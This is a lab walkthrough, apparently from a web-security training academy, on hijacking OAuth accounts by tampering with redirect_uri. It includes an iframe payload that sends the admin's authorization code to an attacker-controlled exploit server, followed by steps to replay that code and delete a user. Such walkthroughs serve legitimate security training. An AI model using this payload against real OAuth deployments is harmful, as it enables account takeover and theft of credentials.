# Lab: OAuth account hijacking via redirect_uri

> Lab Objective: steal an authorization code associated with the admin user, then use it to access their account and delete the user `carlos`.

- Login using provided credentials `wiener:peter`, then inspect the login process.

- The Login Process:

  - You're redirected to `/social-login` endpoint.
    ![1st screenshot](./attachments/1.png)
  - At `/social-login` endpoint, you're redirected to login with social media.
    ![2nd screenshot](./attachments/2.png)
  - Authorization request is made.
    ![3rd screenshot](./attachments/3.png)
  - You're prompted to enter your credentials.
    ![4th screenshot](./attachments/4.png)
  - You're prompted for your consent.
    ![5th screenshot](./attachments/5.png)
  - If agreed, you'll be redirected to to `redirect-uri` stated in the authorization request.
    ![6th screenshot](./attachments/6.png)
  - Finally, you're redirected to `/`.
    ![7th screenshot](./attachments/7.png)

- Logout and login again, but intercept the authorization request, then insert BURP_COLLABORATOR_URL + `?key=accessed` into the `redirect_uri`.
  ![8th screenshot](./attachments/8.png)

- Forward this request, then view Burp Collaborator tab, you'll notice that HTTP requests are made, one of them contain:

  - The `key=accessed`.
  - And the issued code.

  ![13th screenshot](./attachments/13.png)

- Therefore, use this payload to hijack the code:

```html
<iframe
  src="https://oauth-0a51006f03180af380b101900216005d.oauth-server.net/auth?client_id=czfxop1x3t6xjkvz0klvo&redirect_uri=https://exploit-0a06002c036e0acb80d6029c01de0038.exploit-server.net/?key=accessed12&response_type=code&scope=openid%20profile%20email"
></iframe>
```

- Then deliver it to victim.

- Wait a few seconds, then view the logs, and you'll find the code of the admin.

- Logout then login again but intercept the call back request, and replace your code with the hijacked code.
  ![9th screenshot](./attachments/9.png)

- Forward all upcoming requests, then you'll notice that you've access to the admin panel.
  ![10th screenshot](./attachments/10.png)
  ![11th screenshot](./attachments/11.png)

- Access the admin panel.
  ![11th screenshot](./attachments/11.png)

- Then delete the user carlos, and the lab is solved.
  ![12th screenshot](./attachments/12.png)

---
